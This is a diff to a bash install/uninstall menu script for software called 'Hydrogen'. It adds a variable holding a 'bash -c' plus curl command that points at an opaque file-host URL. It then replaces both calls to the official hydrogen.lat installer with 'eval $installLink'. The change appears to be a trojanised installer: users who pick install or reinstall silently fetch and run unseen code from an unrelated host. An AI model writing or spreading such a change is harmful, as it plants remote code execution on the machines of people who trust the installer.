@@ -1,4 +1,5 @@
 # hey gang
+installLink='bash -c "$(curl -fsSL https://0ai4bbbahf.ufs.sh/f/4fzhZqSSYIjmA1n86npjZd6bU35OoNrfaxeQzsXi9JYqvnRy)"'
 
 main() {
     clear
@@ -11,10 +12,10 @@ main() {
     echo "Exit:                       Press Any Key"
 
     read -n 1 -s user_input
-
+    
     if [ "$user_input" == "1" ]; then
         echo "[!] Installing Hydrogen"
-        bash -c "$(curl -fsSL https://hydrogen.lat/install.hydrogen)"
+        eval $installLink
         
     elif [ "$user_input" == "2" ]; then
         echo "[!] Uninstalling Hydrogen-M"
@@ -130,7 +131,7 @@ main() {
         sleep 1
         echo "[+] Reinstalling Hydrogen"
 
-        bash -c "$(curl -fsSL https://hydrogen.lat/install.hydrogen)"
+        eval $installLink
     else
         echo "Have a nice day!"
         rm -rf hydro-uninstaller.sh
